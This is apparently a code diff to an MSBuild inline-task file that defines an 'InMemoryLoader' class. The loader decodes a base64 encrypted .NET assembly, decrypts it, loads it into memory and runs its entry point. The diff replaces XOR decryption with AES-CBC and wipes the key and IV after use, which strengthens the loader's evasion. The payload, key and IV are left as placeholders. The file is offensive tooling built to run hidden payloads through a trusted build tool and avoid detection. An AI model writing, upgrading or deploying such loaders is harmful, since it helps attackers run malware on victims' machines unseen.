@@ -13,11 +13,13 @@
       <Using Namespace="System" />
       <Using Namespace="System.Reflection" />
       <Using Namespace="System.Runtime.InteropServices" />
+      <Using Namespace="System.Security.Cryptography" />
       <Code Type="Class" Language="cs">
 <![CDATA[
 using System;
 using System.Reflection;
 using System.Runtime.InteropServices;
+using System.Security.Cryptography;
 using Microsoft.Build.Framework;
 using Microsoft.Build.Utilities;
 
@@ -76,21 +78,23 @@ public class InMemoryLoader : Task
         catch { return false; }
     }
 
-    static byte[] XorDecrypt(byte[] data, byte[] key)
+    static byte[] AesDecrypt(byte[] data, byte[] key, byte[] iv)
     {
-        byte[] result = new byte[data.Length];
-        for (int i = 0; i < data.Length; i++)
-            result[i] = (byte)(data[i] ^ key[i % key.Length]);
-        return result;
+        using (RijndaelManaged aes = new RijndaelManaged())
+        {
+            aes.Key = key;
+            aes.IV = iv;
+            aes.Mode = CipherMode.CBC;
+            aes.Padding = PaddingMode.PKCS7;
+            ICryptoTransform decryptor = aes.CreateDecryptor();
+            return decryptor.TransformFinalBlock(data, 0, data.Length);
+        }
     }
 
-    // PAYLOAD - base64-encoded XOR-encrypted assembly
     static string ENCRYPTED_B64 = "YOURPAYLOADHERE";
-
-    // XOR key as base64
     static string KEY_B64 = "YOURKEYHERE";
+    static string IV_B64 = "YOURIVHERE";
 
-    // Args for Main(string[])
     static string[] assemblyArgs = new string[] {
         // YOURARGS
     };
@@ -104,8 +108,11 @@ public class InMemoryLoader : Task
 
             byte[] encrypted = Convert.FromBase64String(ENCRYPTED_B64);
             byte[] key = Convert.FromBase64String(KEY_B64);
-            byte[] clearAssembly = XorDecrypt(encrypted, key);
+            byte[] iv = Convert.FromBase64String(IV_B64);
+            byte[] clearAssembly = AesDecrypt(encrypted, key, iv);
             Array.Clear(encrypted, 0, encrypted.Length);
+            Array.Clear(key, 0, key.Length);
+            Array.Clear(iv, 0, iv.Length);
 
             Assembly asm = Assembly.Load(clearAssembly);
             MethodInfo entry = asm.EntryPoint;
